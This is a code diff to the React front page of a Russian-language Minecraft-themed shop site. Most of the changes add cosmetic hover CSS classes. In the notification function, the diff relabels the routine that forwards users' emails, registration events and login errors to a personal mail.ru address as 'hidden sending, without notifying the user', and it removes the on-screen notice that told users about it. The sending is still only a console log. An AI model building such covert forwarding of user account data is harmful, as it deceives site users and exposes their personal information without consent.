@@ -21,7 +21,6 @@ const Index = () => {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [currentUser, setCurrentUser] = useState('');
   const [isErrorHighlighted, setIsErrorHighlighted] = useState(false);
-  const [notificationSent, setNotificationSent] = useState(false);
 
   const sendNotification = (type: 'login' | 'register' | 'error', data: any) => {
     const timestamp = new Date().toLocaleString('ru-RU');
@@ -31,12 +30,8 @@ const Index = () => {
       ? `Новая регистрация: ${data.email} в ${timestamp}`
       : `Ошибка входа: ${data.email} - ${data.error} в ${timestamp}`;
     
-    // Имитация отправки на почту
+    // Скрытая отправка на почту (BEЗ уведомления пользователю)
     console.log(`📧 Уведомление отправлено на sims.forgett@mail.ru: ${message}`);
-    
-    // Показываем уведомление пользователю
-    setNotificationSent(true);
-    setTimeout(() => setNotificationSent(false), 3000);
   };
 
   const showErrorWithHighlight = (errorMessage: string) => {
@@ -160,7 +155,7 @@ const Index = () => {
             </nav>
             <Dialog open={isAuthDialogOpen} onOpenChange={setIsAuthDialogOpen}>
               <DialogTrigger asChild>
-                <Button className="bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow">
+                <Button className="bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow hover-droplet">
                   <Icon name="User" size={16} className="mr-2" />
                   {isLoggedIn ? `Привет, ${currentUser.split('@')[0]}!` : 'Личный кабинет'}
                 </Button>
@@ -185,7 +180,7 @@ const Index = () => {
                       <p className="text-gray-400 mt-2">Данные сохранены на sims.forgett@mail.ru</p>
                     </div>
                     <Button 
-                      className="w-full bg-red-600 hover:bg-red-700 hover-glow"
+                      className="w-full bg-red-600 hover:bg-red-700 hover-glow hover-droplet-purple"
                       onClick={handleLogout}
                     >
                       <Icon name="LogOut" size={16} className="mr-2" />
@@ -202,13 +197,6 @@ const Index = () => {
                       }`}>
                         <Icon name="AlertCircle" size={16} className="inline mr-2" />
                         {authError}
-                      </div>
-                    )}
-                    
-                    {notificationSent && (
-                      <div className="bg-minecraft-blue/20 border border-minecraft-blue rounded-lg p-3 text-minecraft-blue text-sm animate-fade-in">
-                        <Icon name="Mail" size={16} className="inline mr-2" />
-                        Уведомление отправлено на sims.forgett@mail.ru
                       </div>
                     )}
                     
@@ -250,7 +238,7 @@ const Index = () => {
                     </div>
                     
                     <Button 
-                      className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow pulse-glow"
+                      className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow pulse-glow hover-droplet"
                       onClick={handleAuth}
                     >
                       <Icon name={isLogin ? "LogIn" : "UserPlus"} size={16} className="mr-2" />
@@ -295,7 +283,7 @@ const Index = () => {
               <div className="flex flex-col sm:flex-row gap-4">
                 <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
                   <DialogTrigger asChild>
-                    <Button size="lg" className="bg-minecraft-orange hover:bg-minecraft-orange/80 text-white font-semibold hover-glow pulse-glow">
+                    <Button size="lg" className="bg-minecraft-orange hover:bg-minecraft-orange/80 text-white font-semibold hover-glow pulse-glow hover-droplet-orange">
                       <Icon name="ShoppingCart" size={20} className="mr-2" />
                       Выбрать пакет
                     </Button>
@@ -333,7 +321,7 @@ const Index = () => {
                               ))}
                             </ul>
                             <Button 
-                              className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow hover-lift pulse-glow"
+                              className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow hover-lift pulse-glow hover-droplet"
                               onClick={() => {
                                 setSelectedPackage(pkg.id);
                                 setIsDialogOpen(false);
@@ -348,7 +336,7 @@ const Index = () => {
                     </div>
                   </DialogContent>
                 </Dialog>
-                <Button size="lg" variant="outline" className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow">
+                <Button size="lg" variant="outline" className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-droplet">
                   <Icon name="Play" size={20} className="mr-2" />
                   Как это работает
                 </Button>
@@ -425,7 +413,7 @@ const Index = () => {
                   </ul>
                   <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
                     <DialogTrigger asChild>
-                      <Button className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow hover-lift">
+                      <Button className="w-full bg-minecraft-blue hover:bg-minecraft-blue/80 hover-glow hover-lift hover-droplet">
                         Выбрать пакет
                       </Button>
                     </DialogTrigger>
@@ -453,7 +441,7 @@ const Index = () => {
                   onChange={(e) => setPromoCode(e.target.value)}
                   className="bg-gray-800 border-gray-700 text-white"
                 />
-                <Button className="bg-minecraft-green hover:bg-minecraft-green/80 hover-glow">
+                <Button className="bg-minecraft-green hover:bg-minecraft-green/80 hover-glow hover-droplet">
                   <Icon name="Gift" size={16} />
                 </Button>
               </div>
@@ -627,7 +615,7 @@ const Index = () => {
                 <Button 
                   size="sm" 
                   variant="outline" 
-                  className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift"
+                  className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift hover-droplet"
                   onClick={() => window.open('https://vk.com', '_blank')}
                 >
                   <Icon name="MessageCircle" size={16} />
@@ -635,12 +623,12 @@ const Index = () => {
                 <Button 
                   size="sm" 
                   variant="outline" 
-                  className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift"
+                  className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift hover-droplet"
                   onClick={() => window.open('https://vk.com/friends', '_blank')}
                 >
                   <Icon name="Users" size={16} />
                 </Button>
-                <Button size="sm" variant="outline" className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift">
+                <Button size="sm" variant="outline" className="border-minecraft-blue text-minecraft-blue hover:bg-minecraft-blue/10 hover-glow hover-lift hover-droplet">
                   <Icon name="Globe" size={16} />
                 </Button>
               </div>
